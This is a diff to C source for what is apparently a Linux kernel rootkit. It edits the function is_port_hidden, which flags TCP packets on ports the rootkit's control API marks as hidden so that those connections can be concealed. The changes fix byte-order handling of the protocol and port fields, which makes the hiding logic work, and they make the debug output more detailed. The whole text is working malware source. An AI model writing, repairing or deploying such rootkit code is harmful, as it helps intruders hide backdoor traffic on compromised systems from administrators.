@@ -43,25 +43,25 @@ is_port_hidden (struct sk_buff *skb)
 {
 	struct iphdr *ip_header;
 	struct tcphdr *tcp_header;
-	
+
 	/* check if this frame contains an IP packet */
 	if (skb->protocol == htons(ETH_P_IP)) {
 		ip_header = (struct iphdr *) skb_network_header(skb);
 		
 		/* check if this is an TCP packet */
-		if (ip_header->protocol == htons(6)) {
+		if (ip_header->protocol == 6) {
 			tcp_header = (struct tcphdr *) skb_transport_header(skb);
 			
 			/* check with the control API if this service is hidden */
-			if (is_service_hidden(tcp_header->source)
-					|| is_service_hidden(tcp_header->dest)) {
+			if (is_service_hidden(ntohs(tcp_header->source))
+					|| is_service_hidden(ntohs(tcp_header->dest))) {
 				
-				ROOTKIT_DEBUG("Filtered service.\n");
-				
+				ROOTKIT_DEBUG("Filtered TCP packet detected. Src: %u Dest: %u\n", ntohs(tcp_header->source), ntohs(tcp_header->dest));
+			
 				return 1;
 			}
 			
-			ROOTKIT_DEBUG("Unfiltered TCP packet detected. Src: %u Dest: %u\n", tcp_header->source, tcp_header->dest);
+			ROOTKIT_DEBUG("Unfiltered TCP packet detected. Src: %u Dest: %u\n", ntohs(tcp_header->source), ntohs(tcp_header->dest));
 		}
 		
 	}
